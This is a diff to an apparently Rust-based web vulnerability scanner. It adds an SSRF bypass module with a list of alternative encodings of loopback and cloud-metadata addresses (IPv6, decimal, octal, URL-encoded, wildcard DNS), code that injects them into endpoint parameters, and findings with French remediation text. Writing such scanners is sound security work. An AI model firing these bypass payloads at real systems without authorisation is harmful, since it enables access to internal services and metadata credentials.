@@ -52,6 +52,30 @@ const PROBES: &[SsrfProbe] = &[
     },
 ];
 
+// Bypass techniques — alternative representations of 127.0.0.1 / 169.254.x
+// that evade naive blocklists based on string matching.
+struct SsrfBypass {
+    url: &'static str,
+    description: &'static str,
+}
+
+const BYPASS_PROBES: &[SsrfBypass] = &[
+    // IPv6 representations
+    SsrfBypass { url: "http://[::1]/",               description: "IPv6 loopback ::1" },
+    SsrfBypass { url: "http://[::ffff:127.0.0.1]/",  description: "IPv4-mapped IPv6 loopback" },
+    SsrfBypass { url: "http://[::ffff:7f00:1]/",     description: "IPv4-mapped IPv6 loopback (hex)" },
+    // Decimal notation
+    SsrfBypass { url: "http://2130706433/",           description: "127.0.0.1 en décimal (2130706433)" },
+    SsrfBypass { url: "http://2852039166/",           description: "169.254.169.254 en décimal" },
+    // Octal notation
+    SsrfBypass { url: "http://0177.0.0.1/",          description: "127.0.0.1 en octal" },
+    // URL-encoded
+    SsrfBypass { url: "http://%31%32%37%2e%30%2e%30%2e%31/", description: "127.0.0.1 URL-encoded" },
+    // Shortened / redirect domains known to point to localhost
+    SsrfBypass { url: "http://127.0.0.1.nip.io/",   description: "nip.io wildcard DNS → 127.0.0.1" },
+    SsrfBypass { url: "http://localtest.me/",        description: "localtest.me → 127.0.0.1" },
+];
+
 /// HTTP headers that may be used to inject SSRF targets
 const SSRF_HEADERS: &[&str] = &[
     "X-Forwarded-Host",
@@ -127,6 +151,14 @@ impl AttackModule for SsrfModule {
             // Header-based SSRF
             if let Some(f) = check_header_ssrf(client, ep).await {
                 findings.push(f);
+            }
+
+            // Bypass techniques (IPv6, decimal, URL-encoded, etc.)
+            for param in &candidates {
+                if let Some(f) = probe_ssrf_bypass(client, ep, param).await {
+                    findings.push(f);
+                    break;
+                }
             }
         }
 
@@ -320,6 +352,87 @@ async fn check_header_ssrf(client: &HttpClient, ep: &Endpoint) -> Option<Finding
                 ];
                 return Some(f);
             }
+        }
+    }
+
+    None
+}
+
+// ---------------------------------------------------------------------------
+// Check: SSRF via bypass techniques
+// ---------------------------------------------------------------------------
+
+async fn probe_ssrf_bypass(
+    client: &HttpClient,
+    ep: &Endpoint,
+    param: &str,
+) -> Option<Finding> {
+    let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::GET);
+
+    for bypass in BYPASS_PROBES {
+        let result = if matches!(ep.method.as_str(), "GET" | "HEAD" | "DELETE") {
+            let sep = if ep.full_url.contains('?') { '&' } else { '?' };
+            let url = format!("{}{}{}={}", ep.full_url, sep, param, urlenc(bypass.url));
+            let Ok(req) = client.inner().request(method.clone(), &url).build() else { continue };
+            client.send(req).await.ok()?
+        } else {
+            let body = serde_json::json!({ param: bypass.url });
+            let Ok(req) = client
+                .inner()
+                .request(method.clone(), &ep.full_url)
+                .header("Content-Type", "application/json")
+                .body(body.to_string())
+                .build()
+            else {
+                continue;
+            };
+            client.send(req).await.ok()?
+        };
+
+        let status = result.status().as_u16();
+        let body = result.text().await.unwrap_or_default();
+        let body_lower = body.to_lowercase();
+
+        // Any 200 response containing localhost/loopback indicators is suspicious
+        let bypass_hit = status == 200
+            && (body_lower.contains("localhost")
+                || body_lower.contains("127.0.0.1")
+                || body_lower.contains("::1")
+                || body.len() > 100); // non-empty 200 on a loopback address is suspicious
+
+        if bypass_hit {
+            let mut f = Finding::new(
+                format!("SSRF Bypass — `{}` via {}", param, bypass.description),
+                Severity::Critical,
+                9.8,
+                "ssrf",
+                ep.full_url.clone(),
+                ep.method.clone(),
+            );
+            f.description = format!(
+                "Le paramètre `{}` est vulnérable au SSRF via une technique de bypass : {} (`{}`). \
+                 Les filtres basés sur la correspondance de chaînes (\"127.0.0.1\", \"localhost\") \
+                 peuvent être contournés par des représentations alternatives.",
+                param, bypass.description, bypass.url
+            );
+            f.proof = format!(
+                "Payload: {}={}\nHTTP {} — réponse: {}",
+                param,
+                bypass.url,
+                status,
+                body.chars().take(200).collect::<String>()
+            );
+            f.recommendation =
+                "Valider les URLs côté serveur en résolvant le nom d'hôte DNS et en comparant \
+                 l'adresse IP résolue contre une liste de plages bloquées (RFC 1918, 169.254.x.x, ::1). \
+                 Ne pas se fier à la représentation textuelle de l'URL."
+                    .to_string();
+            f.cwe = Some("CWE-918".to_string());
+            f.references = vec![
+                "https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses".to_string(),
+                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html".to_string(),
+            ];
+            return Some(f);
         }
     }
 
